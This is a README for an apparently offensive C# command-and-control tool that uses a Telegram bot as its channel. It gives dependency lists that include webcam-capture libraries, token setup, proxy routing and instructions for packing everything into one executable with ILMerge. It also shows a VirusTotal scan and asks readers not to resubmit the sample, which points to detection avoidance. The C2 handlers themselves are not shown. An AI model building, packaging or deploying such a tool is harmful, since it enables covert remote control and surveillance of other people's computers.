# Telegra_Csharp_C2
Command and Control for C# Writing

Author:  Leiothrix

Telegram:  @Leiothrix

Twitter:  @wh4am1

Team:  QQ愛&Love

![logo](https://github.com/sf197/Telegra_Csharp_C2/blob/master/images/logo.png)

# VirusTotal check result
###### Don't pass it on to Virus Total anymore. I've tried it for you.
![VirusTotal](https://github.com/sf197/Telegra_Csharp_C2/blob/master/images/2.png)

link:https://www.virustotal.com/gui/file/ad1cd12bd6c8bee46ab35aa21a4fb48c2bcf9fdddbf1af82ad6f20eb75daa663/detection

# All view

- [Install](#Install)
- [How to used](#how-to-used)
- [Proxy](#Proxy)
- [How to compile](#how-to-compile)

# Install

###### Nuget download these package

```Csharp
using System.IO;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.InputFiles;
using AForge.Video;
using AForge.Controls;
using AForge.Video.DirectShow;
```

###### Add related classes in 'References'

```c#
System.Drawing;
System.Windows.Forms;
```



# How to used

###### Modify your Token to the program

```csharp
 static void Main(){
            botClient = new TelegramBotClient("token");		//Your Token
            botClient.OnMessage += Bot_OnMessage;
            botClient.StartReceiving();
            Thread.Sleep(int.MaxValue);
}
```

![1566355269804](https://github.com/sf197/Telegra_Csharp_C2/blob/master/images/1.png)

###### have good fun.

# Proxy

###### TelegramBotClient allows you to use a proxy for Bot API connections. 



#### HTTP

###### You can pass an IWebProxy to bot client for HTTP Proxies.

```csharp
	// using System.Net;

	var httpProxy = new WebProxy("https://example.org", 8080)
	{
     	Credentials = new NetworkCredential("USERNMAE", "PASSWORD")
	};
	var botClient = new TelegramBotClient("YOUR_API_TOKEN", httpProxy);
```



#### SOCKS 5

###### You can use an external NuGet package: [HttpToSocks5Proxy](https://www.nuget.org/packages/HttpToSocks5Proxy/) provided 

```csharp
// using MihaZupan;

var proxy = new HttpToSocks5Proxy(Socks5ServerAddress, Socks5ServerPort);

// Or if you need credentials for your proxy server:
var proxy = new HttpToSocks5Proxy(
  Socks5ServerAddress, Socks5ServerPort, "USERNAME", "PASSWORD"
);

// Allows you to use proxies that are only allowing connections to Telegram
// Needed for some proxies
proxy.ResolveHostnamesLocally = true;

var botClient = new TelegramBotClient("YOUR_API_TOKEN", proxy);
```

# How to compile
##### How to compile all DLL files into an EXE file
###### First,You need download ILMerge tool,this is a tool for merging all references to .NET programs.
```cmd
ilmerge.exe /target:exe /out:TGbot.exe ConsoleApp1.exe  AForge.Controls.dll AForge.dll AForge.Imaging.dll AForge.Math.dll AForge.Video.DirectShow.dll AForge.Video.dll Newtonsoft.Json.dll Telegram.Bot.dll /targetplatform:v4
```
###### /target -> library=>DLL exe=>exe
###### /targetplatform:v4 -> Compiler platform is .net 4.0
###### /out -> Merged output file,Parameters are followed by files that need to be merged
Finally, generate output in the directory specified by the out parameter

还在完善！还在完善！还在完善！
